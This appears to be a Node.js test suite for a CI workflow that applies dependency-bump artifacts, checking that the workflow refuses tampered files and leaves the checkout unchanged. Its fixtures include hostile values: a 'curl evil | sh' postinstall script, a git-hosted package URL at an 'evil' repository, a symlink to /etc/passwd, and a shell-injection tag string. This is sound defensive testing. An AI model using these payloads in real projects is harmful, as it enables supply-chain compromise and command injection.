import { test } from "node:test";
import assert from "node:assert/strict";
import { cpSync, existsSync, mkdirSync, mkdtempSync, readFileSync, rmSync, symlinkSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { dirname, join } from "node:path";
import { spawnSync } from "node:child_process";

// Runs core-update.yml's own steps, as written, against copies of this repository's package.json and package-lock.json:
// the bump job's "Bump both tarball URLs" and "Collect" steps make the artifact, then the pull-request job's apply step
// (the one that runs before the GitHub App token is minted) takes it or refuses it. A refusal must stop the step with
// an ::error::, write no output and leave the checkout exactly as it was.
// The pinned npm is replaced by a stand-in at the same path that rewrites the lock's two upstream entries the way npm
// would (offline), and refuses to run with any flags other than the lock-only, script-free ones.

const ROOT = process.cwd();
const WORKFLOW = readFileSync(join(ROOT, ".github/workflows/core-update.yml"), "utf8").replace(/\r\n/g, "\n");
const LATEST = "v99.0.0";

function runBlock(marker) {
  const lines = WORKFLOW.split("\n");
  const starts = lines.flatMap((l, i) => (l.trim().replace(/^- /, "") === marker ? [i] : []));
  assert.equal(starts.length, 1, `expected one step with ${marker}`);
  let i = starts[0];
  while (lines[i].trim() !== "run: |") {
    assert.ok(!lines[i + 1].startsWith("      - "), `the step with ${marker} has no run block`);
    i += 1;
  }
  const body = [];
  for (const line of lines.slice(i + 1)) {
    if (line.trim() && !line.startsWith(" ".repeat(10))) break;
    body.push(line.slice(10));
  }
  return body.join("\n") + "\n";
}

const FAKE_NPM = String.raw`
const fs = require("node:fs");
const crypto = require("node:crypto");
const args = process.argv.slice(2);
if (args.join(" ") === "--version") { console.log("11.20.0"); process.exit(0); }
const want = "install --package-lock-only --ignore-scripts --allow-git=none --allow-remote=root --allow-file=none --allow-directory=root --no-audit --no-fund --no-update-notifier";
if (args.join(" ") !== want) { console.error("stand-in npm: unexpected arguments " + args.join(" ")); process.exit(3); }
if (process.env.FAKE_NPM_FAIL) process.exit(1);
const pkg = JSON.parse(fs.readFileSync("package.json", "utf8"));
const lock = JSON.parse(fs.readFileSync("package-lock.json", "utf8"));
for (const p of ["migration-core", "migration-ui"]) {
  const name = "@hybridcloudworks/" + p;
  const url = pkg.dependencies[name];
  const version = url.match(/-([0-9]+\.[0-9]+\.[0-9]+)\.tgz$/)[1];
  lock.packages[""].dependencies[name] = url;
  const e = lock.packages["node_modules/" + name];
  e.version = version;
  e.resolved = url;
  e.integrity = "sha512-" + crypto.createHash("sha512").update(url).digest("base64");
  if (e.dependencies && e.dependencies["@hybridcloudworks/migration-core"]) e.dependencies["@hybridcloudworks/migration-core"] = version;
}
if (process.env.FAKE_NPM_GIT) lock.packages["node_modules/react"].resolved = "git+ssh://git@github.com/evil/react.git";
fs.writeFileSync("package-lock.json", JSON.stringify(lock, null, 2) + "\n");
if (process.env.FAKE_NPM_EXTRA) fs.writeFileSync("planted.js", "console.log(1)\n");
`;

const gitEnv = { ...process.env, GIT_CONFIG_GLOBAL: "/dev/null", GIT_CONFIG_NOSYSTEM: "1" };
const git = (cwd, ...args) => {
  const r = spawnSync("git", args, { cwd, env: gitEnv, encoding: "utf8" });
  assert.equal(r.status, 0, r.stderr);
  return r.stdout;
};
const status = (repo) => git(repo, "status", "--porcelain", "--untracked-files=all").split("\n").filter(Boolean).sort();

function placeNpm(temp) {
  const cli = join(temp, "npm-pinned/package/bin/npm-cli.js");
  mkdirSync(dirname(cli), { recursive: true });
  writeFileSync(cli, FAKE_NPM);
}

function bash(script, cwd, env) {
  return spawnSync("bash", ["-c", script], { cwd, env: { ...gitEnv, ...env }, encoding: "utf8" });
}

// A clean checkout, and the artifact the bump job would upload for it, downloaded into the pull-request job's temp.
function bumpRun() {
  const tmp = mkdtempSync(join(tmpdir(), "core-update-apply-"));
  const repo = join(tmp, "repo");
  for (const f of ["package.json", "package-lock.json", "scripts/core-update-pin.mjs", ".gitignore"]) {
    mkdirSync(dirname(join(repo, f)), { recursive: true });
    cpSync(join(ROOT, f), join(repo, f));
  }
  writeFileSync(join(repo, "README.md"), "edition\n");
  git(repo, "init", "-q");
  git(repo, "add", "-A");
  git(repo, "-c", "user.name=t", "-c", "user.email=t@t", "commit", "-qm", "base");
  const current = readFileSync(join(repo, "package.json"), "utf8").match(/releases\/download\/(v[0-9.]+)\/hybridcloudworks-migration-core-/)[1];
  const jobA = join(tmp, "job-a");
  const tempA = join(tmp, "temp-a");
  const tempB = join(tmp, "temp-b");
  git(tmp, "clone", "-q", repo, jobA);
  placeNpm(tempA);
  placeNpm(tempB);
  const bump = bash(runBlock("name: Bump both tarball URLs and re-lock (the lock records each tarball's integrity hash)"), jobA, {
    RUNNER_TEMP: tempA,
    LATEST,
    CURRENT: current,
  });
  assert.equal(bump.status, 0, bump.stdout + bump.stderr);
  const collect = bash(runBlock("name: Collect the bump for the pull-request job"), jobA, { RUNNER_TEMP: tempA, COMPAT: "success" });
  assert.equal(collect.status, 0, collect.stdout + collect.stderr);
  cpSync(join(tempA, "bump"), join(tempB, "bump"), { recursive: true });
  return { tmp, repo, temp: tempB, art: join(tempB, "bump"), current, jobA };
}

function apply(run, { latest = LATEST, current = run.current, env = {} } = {}) {
  const output = join(run.temp, "github_output");
  writeFileSync(output, "");
  const r = bash(runBlock("id: apply"), run.repo, { RUNNER_TEMP: run.temp, GITHUB_OUTPUT: output, LATEST: latest, CURRENT: current, ...env });
  return { ...r, output: readFileSync(output, "utf8") };
}

const editJson = (path, change) => {
  const value = JSON.parse(readFileSync(path, "utf8"));
  change(value);
  writeFileSync(path, JSON.stringify(value, null, 2) + "\n");
};

test("the apply step takes a bump identical to its own, and changes only package.json and package-lock.json", () => {
  const run = bumpRun();
  try {
    const r = apply(run);
    assert.equal(r.status, 0, r.stdout + r.stderr);
    assert.equal(r.output, "outcome=success\n");
    assert.deepEqual(status(run.repo), [" M package-lock.json", " M package.json"]);
    for (const f of ["package.json", "package-lock.json"]) {
      assert.equal(readFileSync(join(run.repo, f), "utf8"), readFileSync(join(run.art, "files", f), "utf8"));
    }
    assert.match(readFileSync(join(run.repo, "package.json"), "utf8"), /releases\/download\/v99\.0\.0\/hybridcloudworks-migration-ui-99\.0\.0\.tgz/);
  } finally {
    rmSync(run.tmp, { recursive: true, force: true });
  }
});

test("a failed compatibility check still passes through, as the outcome failure", () => {
  const run = bumpRun();
  try {
    writeFileSync(join(run.art, "outcome.txt"), "failure\n");
    const r = apply(run);
    assert.equal(r.status, 0, r.stdout + r.stderr);
    assert.equal(r.output, "outcome=failure\n");
  } finally {
    rmSync(run.tmp, { recursive: true, force: true });
  }
});

const files = (art, f) => join(art, "files", f);
const OTHER_SHA512 = "sha512-" + "A".repeat(86) + "==";
const TAMPERING = {
  "an extra dependency in package.json": [/package\.json in the artifact differs/, (art) => editJson(files(art, "package.json"), (p) => (p.dependencies["left-pad"] = "1.3.0"))],
  "an install script added to package.json": [/package\.json in the artifact differs/, (art) => editJson(files(art, "package.json"), (p) => (p.scripts.postinstall = "curl evil | sh"))],
  "a changed integrity in package-lock.json": [/package-lock\.json in the artifact differs/, (art) =>
    editJson(files(art, "package-lock.json"), (l) => (l.packages["node_modules/@hybridcloudworks/migration-core"].integrity = OTHER_SHA512))],
  "a changed resolved URL in package-lock.json": [/package-lock\.json in the artifact differs/, (art) =>
    editJson(files(art, "package-lock.json"), (l) => (l.packages["node_modules/@hybridcloudworks/migration-ui"].resolved = "https://example.invalid/ui.tgz"))],
  "a registry package moved to another host": [/package-lock\.json in the artifact differs/, (art) =>
    editJson(files(art, "package-lock.json"), (l) => (l.packages["node_modules/react"].resolved = "https://example.invalid/react.tgz"))],
  "one byte of whitespace in package-lock.json": [/package-lock\.json in the artifact differs/, (art) => writeFileSync(files(art, "package-lock.json"), readFileSync(files(art, "package-lock.json"), "utf8") + " ")],
  "an extra file beside the two": [/holds something besides/, (art) => writeFileSync(files(art, ".npmrc"), "ignore-scripts=false\n")],
  "an extra file in a folder": [/holds something besides/, (art) => {
    mkdirSync(files(art, "apps/lab-api/src"), { recursive: true });
    writeFileSync(files(art, "apps/lab-api/src/app.ts"), "evil\n");
  }],
  "an extra entry at the top of the artifact": [/holds something besides/, (art) => writeFileSync(join(art, "run.sh"), "echo planted\n")],
  "a symbolic link in place of the lock": [/a link or a special file/, (art) => {
    rmSync(files(art, "package-lock.json"));
    symlinkSync("/etc/passwd", files(art, "package-lock.json"));
  }],
  "package-lock.json missing": [/holds something besides/, (art) => rmSync(files(art, "package-lock.json"))],
  "package.json missing": [/holds something besides/, (art) => rmSync(files(art, "package.json"))],
  "an outcome with a second line": [/neither success nor failure/, (art) => writeFileSync(join(art, "outcome.txt"), "success\nx=y\n")],
  "an outcome that is neither word": [/neither success nor failure/, (art) => writeFileSync(join(art, "outcome.txt"), "maybe\n")],
  "an outcome that is too long": [/the outcome is too long/, (art) => writeFileSync(join(art, "outcome.txt"), "success" + " ".repeat(40) + "\n")],
  "no outcome": [/the artifact is incomplete/, (art) => rmSync(join(art, "outcome.txt"))],
  "no files folder": [/the artifact is incomplete/, (art) => rmSync(join(art, "files"), { recursive: true })],
};

for (const [name, [reason, tamper]] of Object.entries(TAMPERING)) {
  test(`the apply step refuses ${name} and leaves the checkout unchanged`, () => {
    const run = bumpRun();
    try {
      tamper(run.art);
      const r = apply(run);
      assert.equal(r.status, 1, r.stdout + r.stderr);
      assert.match(r.stdout, new RegExp(`::error::.*${reason.source}`));
      assert.equal(r.output, "", "nothing may reach GITHUB_OUTPUT");
      assert.deepEqual(status(run.repo), []);
    } finally {
      rmSync(run.tmp, { recursive: true, force: true });
    }
  });
}

const REGEN = {
  "the re-lock fails": [/npm could not re-lock/, { FAKE_NPM_FAIL: "1" }],
  "the regenerated lock pulls a package from git": [/breaks the pin policy/, { FAKE_NPM_GIT: "1" }],
  "the regeneration leaves an extra file behind": [/changed something besides/, { FAKE_NPM_EXTRA: "1" }],
};

for (const [name, [reason, env]] of Object.entries(REGEN)) {
  test(`the apply step refuses when ${name}, and leaves the checkout unchanged`, () => {
    const run = bumpRun();
    try {
      const r = apply(run, { env });
      assert.equal(r.status, 1, r.stdout + r.stderr);
      assert.match(r.stdout, new RegExp(`::error::.*${reason.source}`));
      assert.equal(r.output, "");
      assert.deepEqual(status(run.repo), []);
      assert.ok(!existsSync(join(run.repo, "planted.js")));
    } finally {
      rmSync(run.tmp, { recursive: true, force: true });
    }
  });
}

for (const which of ["latest", "current"]) {
  test(`the apply step refuses a malformed ${which} tag before running anything`, () => {
    const run = bumpRun();
    try {
      const hostile = "v9|;etouch${IFS}PWNED;#";
      const r = apply(run, which === "latest" ? { latest: hostile } : { current: hostile });
      assert.equal(r.status, 1, r.stdout + r.stderr);
      assert.match(r.stdout, /::error::the (upstream|pinned) tag is not vMAJOR\.MINOR\.PATCH/);
      assert.equal(r.output, "");
      assert.deepEqual(status(run.repo), []);
      assert.ok(!existsSync(join(run.repo, "PWNED")));
    } finally {
      rmSync(run.tmp, { recursive: true, force: true });
    }
  });
}

test("the apply step refuses a bump that is not from the pinned tag", () => {
  const run = bumpRun();
  try {
    const r = apply(run, { current: "v0.0.1" });
    assert.equal(r.status, 1, r.stdout + r.stderr);
    assert.match(r.stdout, /::error::the bump does not apply to main/);
    assert.deepEqual(status(run.repo), []);
  } finally {
    rmSync(run.tmp, { recursive: true, force: true });
  }
});

test("the refs step refuses a pinned tag in package.json that is not a plain version", () => {
  const tmp = mkdtempSync(join(tmpdir(), "core-update-refs-"));
  try {
    const pkg = readFileSync(join(ROOT, "package.json"), "utf8").replace(/releases\/download\/v[0-9.]+\/hybridcloudworks-migration-core-/, "releases/download/v0.4.1+x/hybridcloudworks-migration-core-");
    writeFileSync(join(tmp, "package.json"), pkg);
    const bin = join(tmp, "bin");
    mkdirSync(bin);
    writeFileSync(join(bin, "gh"), "#!/bin/sh\necho v99.0.0\n", { mode: 0o755 });
    const output = join(tmp, "out");
    writeFileSync(output, "");
    const r = bash(runBlock("id: refs"), tmp, { PATH: `${bin}:/usr/bin:/bin`, GITHUB_OUTPUT: output, REQUESTED: "", UPSTREAM: "x/y" });
    assert.equal(r.status, 1, r.stdout + r.stderr);
    assert.match(r.stdout, /::error::the pinned tag/);
    assert.equal(readFileSync(output, "utf8"), "");
  } finally {
    rmSync(tmp, { recursive: true, force: true });
  }
});
